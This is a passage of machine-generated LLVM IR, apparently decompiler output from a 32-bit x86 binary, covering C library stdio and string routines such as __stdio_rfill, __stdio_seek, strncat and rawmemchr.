  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = ptrtoint i32* %arg1 to i32
  store i32 %tmp6, i32* %ebx.global-to-local, align 4
  store i32 %arg2, i32* %edi.global-to-local, align 4
  %v2_80566d0 = load i32, i32* %arg1, align 4
  store i32 %v2_80566d0, i32* %esi.global-to-local, align 4
  %v1_80566d7 = urem i32 %v2_80566d0, 4
  %v2_80566d7 = icmp eq i32 %v1_80566d7, 0
  store i32 %v1_80566d7, i32* %ecx.global-to-local, align 4
  br i1 %v2_80566d7, label %dec_label_pc_8056706, label %dec_label_pc_80566dc

dec_label_pc_80566dc:                             ; preds = %entry
  %v1_80566de = add nsw i32 %v1_80566d7, -1
  %v8_80566de = icmp eq i32 %v1_80566de, 0
  store i32 %v1_80566de, i32* @edx, align 4
  br i1 %v8_80566de, label %dec_label_pc_8056706, label %dec_label_pc_80566e1

dec_label_pc_80566e1:                             ; preds = %dec_label_pc_80566dc
  %v3_80566e1 = and i32 %v2_80566d0, 2048
  %v4_80566e1 = icmp eq i32 %v3_80566e1, 0
  br i1 %v4_80566e1, label %dec_label_pc_8056706, label %dec_label_pc_80566e6

dec_label_pc_80566e6:                             ; preds = %dec_label_pc_80566e1
  %v6_80566e6 = sub nsw i32 1, %v1_80566d7
  %v7_80566e6 = and i32 %v1_80566de, %v6_80566e6
  %v8_80566e6 = icmp slt i32 %v7_80566e6, 0
  %v9_80566e6 = icmp eq i32 %v1_80566d7, 2
  %v10_80566e6 = icmp ult i32 %v1_80566d7, 2
  %v3_80566e9 = icmp eq i1 %v10_80566e6, %v8_80566e6
  %v4_80566e9 = icmp eq i1 %v9_80566e6, false
  %v5_80566e9 = and i1 %v4_80566e9, %v3_80566e9
  br i1 %v5_80566e9, label %dec_label_pc_805675c, label %dec_label_pc_80566eb

dec_label_pc_80566eb:                             ; preds = %dec_label_pc_80566e6
  %v1_80566eb = add i32 %tmp6, 40
  %v2_80566eb = inttoptr i32 %v1_80566eb to i32*
  %v3_80566eb = load i32, i32* %v2_80566eb, align 4
  %v4_80566eb = icmp eq i32 %v3_80566eb, 0
  %v1_80566ef = icmp eq i1 %v4_80566eb, false
  br i1 %v1_80566ef, label %dec_label_pc_805675c, label %dec_label_pc_80566f1

dec_label_pc_80566f1:                             ; preds = %dec_label_pc_80566eb
  %v1_80566f1 = add i32 %tmp6, 3
  %v2_80566f1 = inttoptr i32 %v1_80566f1 to i8*
  %v3_80566f1 = load i8, i8* %v2_80566f1, align 1
  %v4_80566f1 = zext i8 %v3_80566f1 to i32
  %v2_80566f5 = sub nsw i32 %v1_80566de, %v4_80566f1
  %v1_80566f7 = add i32 %tmp6, 44
  %v2_80566f7 = inttoptr i32 %v1_80566f7 to i32*
  %v3_80566f7 = load i32, i32* %v2_80566f7, align 4
  %v1_80566fb = add nsw i32 %v2_80566f5, -1
  %tmp12 = icmp slt i32 %v3_80566f7, 1
  br i1 %tmp12, label %dec_label_pc_8056706, label %dec_label_pc_8056700

dec_label_pc_8056700:                             ; preds = %dec_label_pc_80566f1
  %v1_8056700 = add i32 %tmp6, 2
  %v2_8056700 = inttoptr i32 %v1_8056700 to i8*
  %v3_8056700 = load i8, i8* %v2_8056700, align 1
  %v4_8056700 = zext i8 %v3_8056700 to i32
  %v2_8056704 = sub nsw i32 %v1_80566fb, %v4_8056700
  br label %dec_label_pc_8056706

dec_label_pc_8056706:                             ; preds = %dec_label_pc_80566f1, %dec_label_pc_80566e1, %dec_label_pc_80566dc, %entry, %dec_label_pc_8056700
  %v0_805671d = phi i32 [ %v1_80566fb, %dec_label_pc_80566f1 ], [ %v1_80566de, %dec_label_pc_80566e1 ], [ 0, %dec_label_pc_80566dc ], [ 0, %entry ], [ %v2_8056704, %dec_label_pc_8056700 ]
  %v2_8056706 = and i32 %v2_80566d0, 64
  %v3_8056706 = icmp eq i32 %v2_8056706, 0
  %storemerge.in.in.v = select i1 %v3_8056706, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp6
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  %v2_8056715 = add i32 %tmp6, 16
  %v3_8056715 = inttoptr i32 %v2_8056715 to i32*
  %v4_8056715 = load i32, i32* %v3_8056715, align 4
  %v5_8056715 = sub i32 %storemerge, %v4_8056715
  %v1_8056718 = inttoptr i32 %arg2 to i32*
  %v2_8056718 = load i32, i32* %v1_8056718, align 4
  store i32 %v2_8056718, i32* %ecx.global-to-local, align 4
  %v1_805671a = add i32 %arg2, 4
  %v2_805671a = inttoptr i32 %v1_805671a to i32*
  %v3_805671a = load i32, i32* %v2_805671a, align 4
  store i32 %v3_805671a, i32* %ebx.global-to-local, align 4
  %v2_805671d = add i32 %v5_8056715, %v0_805671d
  store i32 %v2_805671d, i32* %esi.global-to-local, align 4
  %v2_8056728 = ashr i32 %v2_805671d, 31
  %v5_8056731 = sub i32 %v2_8056718, %v2_805671d
  %v10_8056731 = icmp ult i32 %v2_8056718, %v2_805671d
  %v6_8056735 = zext i1 %v10_8056731 to i32
  %tmp = icmp slt i32 %v2_805671d, 0
  %v2_8056728.neg = zext i1 %tmp to i32
  %v7_8056735 = add i32 %v3_805671a, %v2_8056728.neg
  %v8_8056735 = add i32 %v7_8056735, %v6_8056735
  store i32 %v8_8056735, i32* @edx, align 4
  store i32 %v5_8056731, i32* %v1_8056718, align 4
  %v0_805673b = load i32, i32* @edx, align 4
  %v1_805673b = load i32, i32* %edi.global-to-local, align 4
  %v2_805673b = add i32 %v1_805673b, 4
  %v3_805673b = inttoptr i32 %v2_805673b to i32*
  store i32 %v0_805673b, i32* %v3_805673b, align 4
  %v0_805673e = load i32, i32* %edi.global-to-local, align 4
  %v1_805673e = add i32 %v0_805673e, 4
  %v2_805673e = inttoptr i32 %v1_805673e to i32*
  %v3_805673e = load i32, i32* %v2_805673e, align 4
  %v4_805673e = load i32, i32* %ebx.global-to-local, align 4
  %v5_8056741 = icmp slt i32 %v3_805673e, %v4_805673e
  br i1 %v5_8056741, label %dec_label_pc_805674b, label %dec_label_pc_8056743

dec_label_pc_8056743:                             ; preds = %dec_label_pc_8056706
  %v8_8056743 = icmp sgt i32 %v3_805673e, %v4_805673e
  br i1 %v8_8056743, label %dec_label_pc_8056749, label %dec_label_pc_8056745

dec_label_pc_8056745:                             ; preds = %dec_label_pc_8056743
  %v1_8056745 = inttoptr i32 %v0_805673e to i32*
  %v2_8056745 = load i32, i32* %v1_8056745, align 4
  %v3_8056745 = load i32, i32* %ecx.global-to-local, align 4
  %tmp14 = icmp ugt i32 %v2_8056745, %v3_8056745
  br i1 %tmp14, label %dec_label_pc_8056749, label %dec_label_pc_805674b

dec_label_pc_8056749:                             ; preds = %dec_label_pc_8056745, %dec_label_pc_8056743
  %v0_8056749 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056749 = sub i32 0, %v0_8056749
  store i32 %v1_8056749, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805674b

dec_label_pc_805674b:                             ; preds = %dec_label_pc_8056745, %dec_label_pc_8056706, %dec_label_pc_8056749
  %v0_805674b = load i32, i32* %esi.global-to-local, align 4
  %v2_805674b = icmp slt i32 %v0_805674b, 0
  %v1_805674d = icmp eq i1 %v2_805674b, false
  br i1 %v1_805674d, label %dec_label_pc_805675f, label %dec_label_pc_805674f

dec_label_pc_805674f:                             ; preds = %dec_label_pc_805674b
  %v1_805674f = call i32 @__errno_location(i32 %v2_8056728)
  %v1_8056754 = inttoptr i32 %v1_805674f to i32*
  store i32 75, i32* %v1_8056754, align 4
  %v0_8056762.pre = load i32, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805675f

dec_label_pc_805675c:                             ; preds = %dec_label_pc_80566eb, %dec_label_pc_80566e6
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805675f

dec_label_pc_805675f:                             ; preds = %dec_label_pc_805674b, %dec_label_pc_805674f, %dec_label_pc_805675c
  %v0_8056762 = phi i32 [ %v0_805674b, %dec_label_pc_805674b ], [ %v0_8056762.pre, %dec_label_pc_805674f ], [ -1, %dec_label_pc_805675c ]
  ret i32 %v0_8056762

; uselistorder directives
  uselistorder i32 %v4_805673e, { 1, 0 }
  uselistorder i32 %v3_805673e, { 1, 0 }
  uselistorder i32 %v1_80566de, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_80566d7, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v2_80566d0, { 2, 1, 0, 3 }
  uselistorder i32 %tmp6, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32* %esi.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32 75, { 2, 1, 0 }
  uselistorder i32 2048, { 2, 1, 6, 3, 5, 0, 8, 4, 7 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_805675f, { 2, 1, 0 }
  uselistorder label %dec_label_pc_805674b, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8056706, { 4, 0, 1, 2, 3 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8056768 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8056770 = add i32 %arg1, 8
  %v2_8056770 = inttoptr i32 %v1_8056770 to i32*
  %v3_8056770 = load i32, i32* %v2_8056770, align 4
  store i32 %v3_8056770, i32* %edx.global-to-local, align 4
  %v1_8056773 = add i32 %arg1, 12
  %v2_8056773 = inttoptr i32 %v1_8056773 to i32*
  %v3_8056773 = load i32, i32* %v2_8056773, align 4
  %v2_8056776 = sub i32 %v3_8056773, %v3_8056770
  %v3_805677b = inttoptr i32 %arg1 to i16*
  %v4_805677b = call i32 @__stdio_READ(i16* %v3_805677b, i32 %v3_8056770, i32 %v2_8056776)
  %v0_8056780 = load i32, i32* @ebx, align 4
  %v1_8056780 = add i32 %v0_8056780, 8
  %v2_8056780 = inttoptr i32 %v1_8056780 to i32*
  %v3_8056780 = load i32, i32* %v2_8056780, align 4
  store i32 %v3_8056780, i32* %edx.global-to-local, align 4
  %v2_8056783 = add i32 %v0_8056780, 16
  %v3_8056783 = inttoptr i32 %v2_8056783 to i32*
  store i32 %v3_8056780, i32* %v3_8056783, align 4
  %v0_8056786 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056786 = add i32 %v0_8056786, %v4_805677b
  store i32 %v2_8056786, i32* %edx.global-to-local, align 4
  %v1_8056788 = load i32, i32* @ebx, align 4
  %v2_8056788 = add i32 %v1_8056788, 20
  %v3_8056788 = inttoptr i32 %v2_8056788 to i32*
  store i32 %v2_8056786, i32* %v3_8056788, align 4
  store i32 %v0_8056768, i32* @ebx, align 4
  ret i32 %v4_805677b

; uselistorder directives
  uselistorder i32 %v4_805677b, { 1, 0 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8056790 = load i32, i32* @ebx, align 4
  %v4_8056794 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8056794, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_805679c = bitcast i16* %arg1 to i32*
  %v2_805679c = load i32, i32* %v1_805679c, align 4
  %v1_805679e = urem i32 %v2_805679c, 65536
  %v2_80567a1 = and i32 %v1_805679e, %arg2
  %v3_80567a1 = icmp eq i32 %v2_80567a1, 0
  %v1_80567a3 = icmp eq i1 %v3_80567a1, false
  br i1 %v1_80567a3, label %dec_label_pc_80567b2, label %dec_label_pc_80567a5

dec_label_pc_80567a5:                             ; preds = %entry
  %v1_80567a5 = and i32 %v2_805679c, 2176
  %v2_80567a5 = icmp eq i32 %v1_80567a5, 0
  %v1_80567ab = icmp eq i1 %v2_80567a5, false
  br i1 %v1_80567ab, label %dec_label_pc_80567b9, label %dec_label_pc_80567ad

dec_label_pc_80567ad:                             ; preds = %dec_label_pc_80567a5
  %v2_80567ad = or i32 %v2_805679c, %arg2
  %v1_80567af = trunc i32 %v2_80567ad to i16
  store i16 %v1_80567af, i16* %arg1, align 2
  %v0_80567b2.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80567b2

dec_label_pc_80567b2:                             ; preds = %entry, %dec_label_pc_80567ad
  %v0_80567d4 = phi i32 [ %v4_8056794, %entry ], [ %v0_80567b2.pre, %dec_label_pc_80567ad ]
  %v1_80567b2 = inttoptr i32 %v0_80567d4 to i16*
  %v2_80567b2 = load i16, i16* %v1_80567b2, align 2
  %v2_80567b5 = and i16 %v2_80567b2, 16
  %v3_80567b5 = icmp eq i16 %v2_80567b5, 0
  br i1 %v3_80567b5, label %dec_label_pc_80567cd, label %dec_label_pc_80567b9

dec_label_pc_80567b9:                             ; preds = %dec_label_pc_80567b2, %dec_label_pc_80567a5
  %v1_80567b9 = call i32 @__errno_location(i32 %v0_8056790)
  %v1_80567be = inttoptr i32 %v1_80567b9 to i32*
  store i32 9, i32* %v1_80567be, align 4
  br label %dec_label_pc_80567c4

dec_label_pc_80567c4:                             ; preds = %dec_label_pc_80567d1, %dec_label_pc_80567b9
  %v0_80567c4 = load i32, i32* @ebx, align 4
  %v1_80567c4 = inttoptr i32 %v0_80567c4 to i16*
  %v2_80567c4 = load i16, i16* %v1_80567c4, align 2
  %v3_80567c4 = or i16 %v2_80567c4, 8
  store i16 %v3_80567c4, i16* %v1_80567c4, align 2
  br label %dec_label_pc_80567f1

dec_label_pc_80567cd:                             ; preds = %dec_label_pc_80567b2
  %v2_80567cd = and i16 %v2_80567b2, 64
  %v3_80567cd = icmp eq i16 %v2_80567cd, 0
  br i1 %v3_80567cd, label %dec_label_pc_80567eb, label %dec_label_pc_80567d1

dec_label_pc_80567d1:                             ; preds = %dec_label_pc_80567cd
  %v2_80567d5 = call i32 @__stdio_wcommit(i32 %v0_80567d4)
  %v1_80567dd = icmp eq i32 %v2_80567d5, 0
  %v1_80567df = icmp eq i1 %v1_80567dd, false
  br i1 %v1_80567df, label %dec_label_pc_80567c4, label %dec_label_pc_80567e1

dec_label_pc_80567e1:                             ; preds = %dec_label_pc_80567d1
  %v0_80567e1 = load i32, i32* @ebx, align 4
  %v1_80567e1 = inttoptr i32 %v0_80567e1 to i16*
  %v2_80567e1 = load i16, i16* %v1_80567e1, align 2
  %v3_80567e1 = and i16 %v2_80567e1, -65
  store i16 %v3_80567e1, i16* %v1_80567e1, align 2
  %v0_80567e5 = load i32, i32* @ebx, align 4
  %v1_80567e5 = add i32 %v0_80567e5, 8
  %v2_80567e5 = inttoptr i32 %v1_80567e5 to i32*
  %v3_80567e5 = load i32, i32* %v2_80567e5, align 4
  %v2_80567e8 = add i32 %v0_80567e5, 28
  %v3_80567e8 = inttoptr i32 %v2_80567e8 to i32*
  store i32 %v3_80567e5, i32* %v3_80567e8, align 4
  %v0_80567eb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_80567eb

dec_label_pc_80567eb:                             ; preds = %dec_label_pc_80567cd, %dec_label_pc_80567e1
  %v9_80567eb = phi i32 [ %v0_80567d4, %dec_label_pc_80567cd ], [ %v0_80567eb.pre, %dec_label_pc_80567e1 ]
  %v1_80567eb = inttoptr i32 %v9_80567eb to i16*
  %v2_80567eb = load i16, i16* %v1_80567eb, align 2
  %v3_80567eb = or i16 %v2_80567eb, 1
  store i16 %v3_80567eb, i16* %v1_80567eb, align 2
  br label %dec_label_pc_80567f1

dec_label_pc_80567f1:                             ; preds = %dec_label_pc_80567c4, %dec_label_pc_80567eb
  %storemerge = phi i32 [ 0, %dec_label_pc_80567eb ], [ -1, %dec_label_pc_80567c4 ]
  store i32 %v0_8056790, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_805679c, { 1, 2, 0 }
  uselistorder i32 %v0_8056790, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 3, 6, 5, 4, 2, 1, 0 }
  uselistorder i16 8, { 3, 4, 0, 1, 5, 2 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 10, 11, 12, 13, 14, 15, 2, 3, 4 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_80567f1, { 1, 0 }
  uselistorder label %dec_label_pc_80567eb, { 1, 0 }
  uselistorder label %dec_label_pc_80567b2, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp5 = ptrtoint i32* %arg2 to i32
  store i32 %tmp5, i32* @ebx, align 4
  %v1_8056804 = add i32 %tmp5, 4
  %v2_8056804 = inttoptr i32 %v1_8056804 to i32*
  %v3_8056804 = load i32, i32* %v2_8056804, align 4
  %v2_8056807 = load i32, i32* %arg2, align 4
  %v1_805680d = add i32 %arg1, 4
  %v2_805680d = inttoptr i32 %v1_805680d to i32*
  %v3_805680d = load i32, i32* %v2_805680d, align 4
  %v4_8056810 = call i32 @__libc_lseek64(i32 %v3_805680d, i32 %v2_8056807, i32 %v3_8056804, i32 %arg3)
  %v0_805681a = load i32, i32* @edx, align 4
  %v2_805681a = icmp slt i32 %v0_805681a, 0
  br i1 %v2_805681a, label %dec_label_pc_8056825, label %dec_label_pc_805681e

dec_label_pc_805681e:                             ; preds = %entry
  %v1_805681e = load i32, i32* @ebx, align 4
  %v2_805681e = inttoptr i32 %v1_805681e to i32*
  store i32 %v4_8056810, i32* %v2_805681e, align 4
  %v0_8056820 = load i32, i32* @edx, align 4
  %v1_8056820 = load i32, i32* @ebx, align 4
  %v2_8056820 = add i32 %v1_8056820, 4
  %v3_8056820 = inttoptr i32 %v2_8056820 to i32*
  store i32 %v0_8056820, i32* %v3_8056820, align 4
  br label %dec_label_pc_8056825

dec_label_pc_8056825:                             ; preds = %entry, %dec_label_pc_805681e
  %v0_8056825 = phi i32 [ %v4_8056810, %entry ], [ 0, %dec_label_pc_805681e ]
  ret i32 %v0_8056825

; uselistorder directives
  uselistorder i32 %tmp5, { 1, 0 }
  uselistorder label %dec_label_pc_8056825, { 1, 0 }
}

define i32 @__GI_strcoll(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v4_805682e = ptrtoint i8* %arg1 to i32
  %v4_8056836.pre = load i32, i32* @eax, align 4
  %v8_8056836.pre = load i1, i1* @df, align 1
  %v9_8056836 = select i1 %v8_8056836.pre, i32 -1, i32 1
  br label %dec_label_pc_8056836

dec_label_pc_8056836:                             ; preds = %dec_label_pc_805683a, %entry
  %v20_8056837 = phi i32 [ %v23_8056837, %dec_label_pc_805683a ], [ %arg2, %entry ]
  %v4_8056836 = phi i32 [ %v6_8056836, %dec_label_pc_805683a ], [ %v4_8056836.pre, %entry ]
  %v7_8056836 = phi i32 [ %v10_8056836, %dec_label_pc_805683a ], [ %v4_805682e, %entry ]
  %v1_8056836 = inttoptr i32 %v7_8056836 to i8*
  %v2_8056836 = load i8, i8* %v1_8056836, align 1
  %v3_8056837 = inttoptr i32 %v20_8056837 to i8*
  %v4_8056837 = load i8, i8* %v3_8056837, align 1
  %v15_8056837 = icmp eq i8 %v2_8056836, %v4_8056837
  %v1_8056838 = icmp eq i1 %v15_8056837, false
  br i1 %v1_8056838, label %dec_label_pc_8056842, label %dec_label_pc_805683a

dec_label_pc_805683a:                             ; preds = %dec_label_pc_8056836
  %v3_8056836 = zext i8 %v2_8056836 to i32
  %v5_8056836 = and i32 %v4_8056836, -256
  %v6_8056836 = or i32 %v3_8056836, %v5_8056836
  %v23_8056837 = add i32 %v20_8056837, %v9_8056836
  %v10_8056836 = add i32 %v7_8056836, %v9_8056836
  %v4_805683a = icmp eq i8 %v2_8056836, 0
  %v1_805683c = icmp eq i1 %v4_805683a, false
  br i1 %v1_805683c, label %dec_label_pc_8056836, label %dec_label_pc_8056846

dec_label_pc_8056842:                             ; preds = %dec_label_pc_8056836
  br label %dec_label_pc_8056846

dec_label_pc_8056846:                             ; preds = %dec_label_pc_805683a, %dec_label_pc_8056842
  %storemerge = phi i32 [ 1, %dec_label_pc_8056842 ], [ 0, %dec_label_pc_805683a ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i8 %v2_8056836, { 1, 2, 0 }
  uselistorder i32 %v9_8056836, { 1, 0 }
  uselistorder label %dec_label_pc_8056846, { 1, 0 }
}

define i32 @__GI_strncat() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-8 = alloca i32, align 4
  %v0_805684d = load i32, i32* @esi, align 4
  store i32 %v0_805684d, i32* %stack_var_-8, align 4
  %v4_805684e = ptrtoint i8* %tmp5 to i32
  store i32 %v4_805684e, i32* %esi.global-to-local, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v4_805685b = inttoptr i32 %tmp to i8*
  store i32 %tmp, i32* %edi.global-to-local, align 4
  %v3_805685f = call i32 @_strlen(i8* %v4_805685b)
  %v2_8056861 = add i32 %tmp, -1
  store i32 %v2_8056861, i32* %edi.global-to-local, align 4
  %v0_8056862 = load i32, i32* %edx.global-to-local, align 4
  %v8_805686510 = icmp eq i32 %v0_8056862, 0
  store i32 %v0_8056862, i32* %ecx.global-to-local, align 4
  br i1 %v8_805686510, label %dec_label_pc_8056870, label %dec_label_pc_8056868.lr.ph

dec_label_pc_8056868.lr.ph:                       ; preds = %entry
  %v4_8056868.pre = load i32, i32* %eax.global-to-local, align 4
  %v8_8056868.pre = load i1, i1* @df, align 1
  br label %dec_label_pc_8056868

dec_label_pc_8056868:                             ; preds = %dec_label_pc_8056868.lr.ph, %dec_label_pc_8056868.dec_label_pc_8056865_crit_edge
  %v8_8056868 = phi i1 [ %v8_8056868.pre, %dec_label_pc_8056868.lr.ph ], [ %v5_8056869, %dec_label_pc_8056868.dec_label_pc_8056865_crit_edge ]
  %v4_8056868 = phi i32 [ %v4_8056868.pre, %dec_label_pc_8056868.lr.ph ], [ %v0_805686a, %dec_label_pc_8056868.dec_label_pc_8056865_crit_edge ]
  %v2_805687211 = phi i32 [ %v2_8056861, %dec_label_pc_8056868.lr.ph ], [ %v7_8056869, %dec_label_pc_8056868.dec_label_pc_8056865_crit_edge ]
  %v0_8056868 = load i32, i32* %esi.global-to-local, align 4
  %v1_8056868 = inttoptr i32 %v0_8056868 to i8*
  %v2_8056868 = load i8, i8* %v1_8056868, align 1
  %v3_8056868 = zext i8 %v2_8056868 to i32
  %v5_8056868 = and i32 %v4_8056868, -256
  %v6_8056868 = or i32 %v5_8056868, %v3_8056868
  store i32 %v6_8056868, i32* %eax.global-to-local, align 4
  %v9_8056868 = select i1 %v8_8056868, i32 -1, i32 1
  %v10_8056868 = add i32 %v9_8056868, %v0_8056868
  store i32 %v10_8056868, i32* %esi.global-to-local, align 4
  %v3_8056869 = inttoptr i32 %v2_805687211 to i8*
  store i8 %v2_8056868, i8* %v3_8056869, align 1
  %v4_8056869 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056869 = load i1, i1* @df, align 1
  %v6_8056869 = select i1 %v5_8056869, i32 -1, i32 1
  %v7_8056869 = add i32 %v6_8056869, %v4_8056869
  store i32 %v7_8056869, i32* %edi.global-to-local, align 4
  %v0_805686a = load i32, i32* %eax.global-to-local, align 4
  %v3_805686a = trunc i32 %v0_805686a to i8
  %v4_805686a = icmp eq i8 %v3_805686a, 0
  %v1_805686c = icmp eq i1 %v4_805686a, false
  br i1 %v1_805686c, label %dec_label_pc_8056868.dec_label_pc_8056865_crit_edge, label %dec_label_pc_8056873

dec_label_pc_8056868.dec_label_pc_8056865_crit_edge: ; preds = %dec_label_pc_8056868
  %v0_8056865.pre = load i32, i32* %ecx.global-to-local, align 4
  %v1_8056865 = add i32 %v0_8056865.pre, -1
  %v8_8056865 = icmp eq i32 %v1_8056865, 0
  store i32 %v1_8056865, i32* %ecx.global-to-local, align 4
  br i1 %v8_8056865, label %dec_label_pc_8056870, label %dec_label_pc_8056868

dec_label_pc_8056870:                             ; preds = %dec_label_pc_8056868.dec_label_pc_8056865_crit_edge, %entry
  %v2_8056872.lcssa = phi i32 [ %v2_8056861, %entry ], [ %v7_8056869, %dec_label_pc_8056868.dec_label_pc_8056865_crit_edge ]
  store i32 0, i32* %eax.global-to-local, align 4
  %v3_8056872 = inttoptr i32 %v2_8056872.lcssa to i8*
  store i8 0, i8* %v3_8056872, align 1
  %v4_8056872 = load i32, i32* %edi.global-to-local, align 4
  %v5_8056872 = load i1, i1* @df, align 1
  %v6_8056872 = select i1 %v5_8056872, i32 -1, i32 1
  %v7_8056872 = add i32 %v6_8056872, %v4_8056872
  store i32 %v7_8056872, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8056873

dec_label_pc_8056873:                             ; preds = %dec_label_pc_8056868, %dec_label_pc_8056870
  store i32 %tmp, i32* %eax.global-to-local, align 4
  %v2_8056877 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8056877, i32* @esi, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v1_8056865, { 1, 0 }
  uselistorder i32 %v0_805686a, { 1, 0 }
  uselistorder i32 %v7_8056869, { 0, 2, 1 }
  uselistorder i1 %v5_8056869, { 1, 0 }
  uselistorder i32 %tmp, { 4, 3, 0, 1, 2 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32* %ecx.global-to-local, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_8056873, { 1, 0 }
  uselistorder label %dec_label_pc_8056868, { 1, 0 }
}

define i32 @rawmemchr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_805687d = load i32, i32* @ebx, align 4
  %v4_805687e = urem i32 %arg2, 256
  %v4_8056882 = ptrtoint i8* %arg1 to i32
  %v2_805688d3 = urem i32 %v4_8056882, 4
  %v3_805688d4 = icmp eq i32 %v2_805688d3, 0
  %v1_805688f8 = icmp eq i1 %v3_805688d4, false
  %v4_8056888 = trunc i32 %arg2 to i8
  br i1 %v1_805688f8, label %dec_label_pc_8056888, label %dec_label_pc_8056891

dec_label_pc_8056888:                             ; preds = %entry, %dec_label_pc_805688c
  %v0_805688c = phi i32 [ %v1_805688c, %dec_label_pc_805688c ], [ %v4_8056882, %entry ]
  %v1_8056888 = inttoptr i32 %v0_805688c to i8*
  %v2_8056888 = load i8, i8* %v1_8056888, align 1
  %v15_8056888 = icmp eq i8 %v2_8056888, %v4_8056888
  br i1 %v15_8056888, label %dec_label_pc_80568dc, label %dec_label_pc_805688c

dec_label_pc_805688c:                             ; preds = %dec_label_pc_8056888
  %v1_805688c = add i32 %v0_805688c, 1
  %v2_805688d = urem i32 %v1_805688c, 4
  %v3_805688d = icmp eq i32 %v2_805688d, 0
  %v1_805688f = icmp eq i1 %v3_805688d, false
  br i1 %v1_805688f, label %dec_label_pc_8056888, label %dec_label_pc_8056891

dec_label_pc_8056891:                             ; preds = %entry, %dec_label_pc_805688c
  %v0_8056894 = phi i32 [ %v1_805688c, %dec_label_pc_805688c ], [ %v4_8056882, %entry ]
  %v2_8056898 = mul nuw nsw i32 %v4_805687e, 256
  %v2_805689b = or i32 %v2_8056898, %v4_805687e
  %v2_805689f = mul i32 %v2_805689b, 65536
  %v2_80568a2 = or i32 %v2_805689f, %v2_805689b
  br label %dec_label_pc_80568a4

dec_label_pc_80568a4:                             ; preds = %dec_label_pc_80568d4, %dec_label_pc_80568a4, %dec_label_pc_8056891
  %v0_80568a8 = phi i32 [ %v0_8056894, %dec_label_pc_8056891 ], [ %v1_80568a8, %dec_label_pc_80568a4 ], [ %v1_80568a8, %dec_label_pc_80568d4 ]
  %v2_80568a6 = inttoptr i32 %v0_80568a8 to i32*
  %v3_80568a6 = load i32, i32* %v2_80568a6, align 4
  %v4_80568a6 = xor i32 %v3_80568a6, %v2_80568a2
  %v1_80568a8 = add i32 %v0_80568a8, 4
  store i32 %v1_80568a8, i32* @ecx, align 4
  %v1_80568ab = add i32 %v4_80568a6, 2130640639
  %v1_80568b1 = sub i32 -1, %v4_80568a6
  store i32 %v1_80568b1, i32* @edx, align 4
  %v2_80568b3 = xor i32 %v1_80568ab, %v1_80568b1
  %v1_80568b5 = and i32 %v2_80568b3, -2130640640
  %v2_80568b5 = icmp eq i32 %v1_80568b5, 0
  br i1 %v2_80568b5, label %dec_label_pc_80568a4, label %dec_label_pc_80568bc

dec_label_pc_80568bc:                             ; preds = %dec_label_pc_80568a4
  %v2_80568bf = inttoptr i32 %v0_80568a8 to i8*
  %v3_80568bf = load i8, i8* %v2_80568bf, align 1
  %v16_80568bf = icmp eq i8 %v3_80568bf, %v4_8056888
  br i1 %v16_80568bf, label %dec_label_pc_80568dc, label %dec_label_pc_80568c4

dec_label_pc_80568c4:                             ; preds = %dec_label_pc_80568bc
  %v1_80568c4 = add i32 %v0_80568a8, 1
  %v2_80568c7 = inttoptr i32 %v1_80568c4 to i8*
  %v3_80568c7 = load i8, i8* %v2_80568c7, align 1
  %v16_80568c7 = icmp eq i8 %v3_80568c7, %v4_8056888
  br i1 %v16_80568c7, label %dec_label_pc_80568dc, label %dec_label_pc_80568cc

